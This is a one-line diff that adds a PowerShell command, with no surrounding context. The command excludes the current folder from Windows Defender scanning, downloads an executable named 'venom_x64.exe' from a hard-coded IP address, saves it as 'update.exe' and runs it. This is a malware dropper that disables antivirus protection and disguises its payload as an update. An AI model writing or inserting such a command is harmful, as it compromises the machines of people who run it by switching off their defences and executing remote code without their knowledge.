@@ -1,0 +1,1 @@
+$curDir = Get-Location;Add-MpPreference -ExclusionPath $curDir;wget "http://192.168.88.201/venom_x64.exe" -outfile $curDir\update.exe;.\update.exe
